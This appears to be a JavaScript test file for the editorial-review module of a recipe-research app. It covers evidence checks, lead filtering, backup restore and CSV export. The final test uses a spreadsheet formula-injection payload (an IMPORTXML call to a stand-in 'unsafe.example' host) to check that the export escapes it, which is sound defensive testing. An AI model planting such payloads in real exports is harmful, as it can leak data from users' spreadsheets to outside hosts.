import test from 'node:test';
import assert from 'node:assert/strict';
import {editorialReview,savedEditorialReview,validEditorialReviews,researchReviewSummary,
  researchLeadResults,exportEditorialReviewCsv} from '../src/editorial.js';
import {emptyStore,parseBackup,exportBackup,loadStore} from '../src/model.js';
const countries=['Bangladesh','India','Italy'];
const categories=['Dessert','Seafood','Vegetarian'];
const stamp=new Date('2026-10-23T09:00:00Z');
const input={
  country:'Bangladesh',category:'Dessert',status:'shortlisted',
  evidenceUrl:'https://example.org/independent-cultural-source',
  notes:'A separate source mentions the regional dish and its neighbouring variations.'
};
const record=()=>editorialReview(input,{id:'wikibooks:125',countries,categories,now:stamp});

test('evidence based shortlisting is only a research status and is not best-30 approval',()=>{
  const review=record();
  assert.equal(review.country,'Bangladesh');
  assert.equal(review.status,'shortlisted');
  assert.equal(review.reviewedAt,'2026-10-23T09:00:00.000Z');
  const saved=savedEditorialReview({},'wikibooks:125',review);
  const summary=researchReviewSummary(saved,'Bangladesh','Dessert');
  assert.deepEqual([summary.shortlisted,summary.verifiedBest],[1,0]);
});
test('rejects category guesses, unsupported status and evidence-free shortlists',()=>{
  const opts={id:'wikibooks:125',countries,categories,now:stamp};
  assert.throws(()=>editorialReview({...input,country:'Unknown'},opts),/country and category/);
  assert.throws(()=>editorialReview({...input,status:'published'},opts),/status/);
  assert.throws(()=>editorialReview({...input,evidenceUrl:''},opts),/Shortlisting/);
  assert.throws(()=>editorialReview({...input,notes:'too short'},opts),/Shortlisting/);
  assert.throws(()=>editorialReview({...input,evidenceUrl:'http://example.org'},opts),/HTTPS/);
  assert.throws(()=>editorialReview({...input,evidenceUrl:'https://en.wikibooks.org/wiki/Cookbook:Recipe'},opts),/beyond/);
  assert.throws(()=>editorialReview(input,{...opts,id:'private-test'}),/Wikibooks/);
});
test('filters by actual source tags and private review status, never automatic country classification',()=>{
  const leads=[
    {id:'wikibooks:125',sourcePageId:125,title:'Biryani'},
    {id:'wikibooks:126',sourcePageId:126,title:'Rice cake'},
    {id:'wikibooks:127',sourcePageId:127,title:'Apple tart'}
  ];
  const evidence=new Map([[125,['South Asian','Rice dishes']],[126,['Desserts','Rice dishes']]]);
  const reviews={'wikibooks:125':record()};
  assert.deepEqual(researchLeadResults(leads,'rice',evidence).map(x=>x.title),['Biryani','Rice cake']);
  assert.deepEqual(researchLeadResults(leads,'',evidence,{tag:'dessert'}).map(x=>x.title),['Rice cake']);
  assert.deepEqual(researchLeadResults(leads,'',evidence,{status:'shortlisted',reviews}).map(x=>x.title),['Biryani']);
  assert.deepEqual(researchLeadResults(leads,'',evidence,{status:'unreviewed',reviews}).map(x=>x.title),['Rice cake','Apple tart']);
});
test('only valid notes can be restored; old backups still load',()=>{
  const local=emptyStore();
  local.editorialReviews=savedEditorialReview(local.editorialReviews,'wikibooks:125',record());
  assert.equal(validEditorialReviews(local.editorialReviews),true);
  assert.deepEqual(parseBackup(exportBackup(local)),local);
  assert.deepEqual(loadStore({getItem:()=>JSON.stringify(local)}).editorialReviews,local.editorialReviews);
  assert.equal(validEditorialReviews({'wikibooks:125':{...record(),status:'shortlisted',notes:''}}),false);
  assert.throws(()=>parseBackup(exportBackup({...local,editorialReviews:{x:record()}})),/invalid editorial research/);
  const legacy={pantry:[],saved:{},plan:{}};
  assert.deepEqual(parseBackup(exportBackup(legacy)),legacy);
  assert.deepEqual(loadStore({getItem:()=>JSON.stringify(legacy)}).editorialReviews,{});
  assert.equal(savedEditorialReview(local.editorialReviews,'wikibooks:125',null)['wikibooks:125'],undefined);
});
test('export includes provenance but never allows CSV formula injection',()=>{
  const review=record();
  const csv=exportEditorialReviewCsv({'wikibooks:125':{
    ...review,notes:'=IMPORTXML("https://unsafe.example", "//x")'
  }},[{id:'wikibooks:125',title:'Biryani',url:'https://en.wikibooks.org/wiki/Cookbook:Biryani'}]);
  assert.ok(csv.includes('NOT APPROVED'));
  assert.ok(csv.includes('https://en.wikibooks.org/wiki/Cookbook:Biryani'));
  assert.ok(csv.includes('"\'=IMPORTXML('));
});
